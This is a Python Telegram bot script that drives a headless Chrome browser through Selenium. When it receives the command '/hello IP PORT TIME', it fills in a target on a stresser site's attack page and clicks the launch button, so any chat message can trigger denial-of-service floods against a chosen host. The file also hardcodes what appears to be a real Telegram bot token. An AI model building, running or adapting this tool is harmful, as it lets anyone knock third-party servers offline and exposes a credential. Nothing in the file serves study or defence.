import re
import time
from telebot import TeleBot
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

BOT_TOKEN = "8421640384:AAEwhC-l296tD_SKwSIclceEEtge3sb4qhc"
WEBSITE_URL = "https://satellitestress.st/attack"

bot = TeleBot(BOT_TOKEN)

def get_headless_driver():
    options = Options()
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--headless=new")           # modern headless mode
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1280,720")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-infobars")

    # Try to use system chromedriver (from replit.nix)
    service = Service("/nix/store/.../bin/chromedriver")   # ← usually works automatically

    # Fallback if path is wrong
    # from webdriver_manager.chrome import ChromeDriverManager
    # service = Service(ChromeDriverManager().install())

    driver = webdriver.Chrome(service=service, options=options)
    return driver

@bot.message_handler(commands=['hello'])
def handle_hello(message):
    try:
        text = message.text.strip()
        parts = re.split(r'\s+', text)
        if len(parts) != 4:
            bot.reply_to(message, "Format: /hello IP PORT TIME")
            return

        ip, port, duration = parts[1], parts[2], parts[3]

        driver = get_headless_driver()
        wait = WebDriverWait(driver, 25)

        driver.get(WEBSITE_URL)
        time.sleep(2.5)  # brutal but often needed

        # Wait for one of the inputs
        wait.until(EC.presence_of_element_located(
            (By.CSS_SELECTOR, "input[placeholder*='104'], input[placeholder*='80'], input[placeholder*='60']")
        ))

        # More robust locators (placeholders tend to change)
        driver.find_element(By.CSS_SELECTOR, "input[placeholder*='104'], input[type='text']:nth-of-type(1)").send_keys(ip)
        driver.find_element(By.CSS_SELECTOR, "input[placeholder*='80'], input[type='text']:nth-of-type(2)").send_keys(port)
        driver.find_element(By.CSS_SELECTOR, "input[placeholder*='60'], input[type='text']:nth-of-type(3)").send_keys(duration)

        # disable random port if exists
        try:
            random_cb = driver.find_element(By.XPATH, "//input[@type='checkbox'][contains(following-sibling::text(),'Random')]")
            if random_cb.is_selected():
                random_cb.click()
        except:
            pass

        # Launch
        btn = wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//button[contains(.,'Launch') or contains(.,'Start') or contains(.,'Attack')]")
        ))
        btn.click()

        bot.reply_to(message, f"Attempted launch → {ip}:{port} / {duration}s")

        driver.quit()   # important – free resources

    except Exception as e:
        bot.reply_to(message, f"Error:\n{str(e)[:400]}")

print("Bot starting...")
bot.infinity_polling()
